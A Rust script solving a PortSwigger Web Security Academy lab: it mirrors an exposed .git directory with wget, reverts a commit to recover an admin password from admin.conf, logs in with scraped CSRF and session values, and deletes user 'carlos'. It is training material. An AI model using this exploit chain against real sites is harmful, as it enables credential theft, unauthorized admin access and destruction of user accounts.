/********************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 4/9/2023
*
* PortSwigger LAB:  Information disclosure in version control history
*
* Steps: 1. Fetch the .git directory
*        2. Reset to the previous commit
*        3. Get the administrator password from the admin.conf file
*        4. Login as administrator
*        5. Delete carlos
*
*********************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr, predicate::Name};
use std::{
    collections::HashMap,
    env, fs,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let domain = "0ade007403ba23d280ff9a0c004f00bb.web-security-academy.net"; // change this to your lab URL
    let client = build_client(); // build the client used in all subsequent requests

    print!(
        "{} ",
        "1. Fetching .git directory (wait a few seconds)..".white()
    );
    io::stdout().flush();
    // fetch the .git directory
    let fetch_git_dir = process::Command::new("wget")
        .args(["-r", &format!("https://{domain}/.git")])
        .output()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch .git directory using wget".red()
        ));
    println!("{}", "OK".green());

    print!("{} ", "2. Changing current working directory..".white());
    io::stdout().flush();
    // change the current working directory
    let change_dir = env::set_current_dir(format!("{domain}")).expect(&format!(
        "{}",
        "[!] Failed to change current working directory".red()
    ));
    println!("{}", "OK".green());

    print!("{} ", "3. Resetting to the previous commit..".white());
    io::stdout().flush();
    // reset to the previous commit
    let reset = process::Command::new("git")
        .args(["reset", "--hard", "HEAD~1"])
        .output()
        .expect(&format!(
            "{}",
            "[!] Failed to list the current working directory".red()
        ));
    println!("{}", "OK".green());

    print!("{} ", "4. Reading admin.conf file..".white());
    io::stdout().flush();
    // read admin.conf file
    let admin_conf = fs::read_to_string("admin.conf")
        .expect(&format!("{}", "[!] Failed to read admin.conf file".red()));
    println!("{}", "OK".green());

    print!("{} ", "5. Extracting the administrator password..".white());
    io::stdout().flush();
    // extract admin password
    let admin_pass = admin_conf
        .split("=")
        .nth(1)
        .unwrap()
        .split("\n") // if you still a windows user, you may need to change this to \r\n
        .nth(0)
        .unwrap();
    println!("{} => {}", "OK".green(), admin_pass.yellow());

    print!(
        "{} ",
        "6. Fetching login page to get a valid session and csrf token..".white()
    );
    io::stdout().flush();
    // fetch login page, extract session cookie and csrf token
    let get_login = client
        .get(format!("https://{domain}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to GET /login as admin".red()));
    let session = extract_session_cookie(get_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
    let csrf =
        extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
    println!("{}", "OK".green());

    print!("{} ", "7. Logging in as administrator..".white());
    io::stdout().flush();
    // login as admin
    let login = client
        .post(format!("https://{domain}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", admin_pass),
            ("csrf", &csrf),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to login as admin".red()));
    if login.status().as_u16() == 302 {
        println!("{}", "OK".green());
    }

    // extract new session cookie
    let new_session = extract_session_cookie(login.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract new session cookie".red()
    ));

    print!("{} ", "8. Deleting carlos..".white());
    io::stdout().flush();
    // delete carlos
    let delete_carlos = client
        .get(format!("https://{domain}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={new_session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*************************************************
 * Function to extract csrf from the response body
 **************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
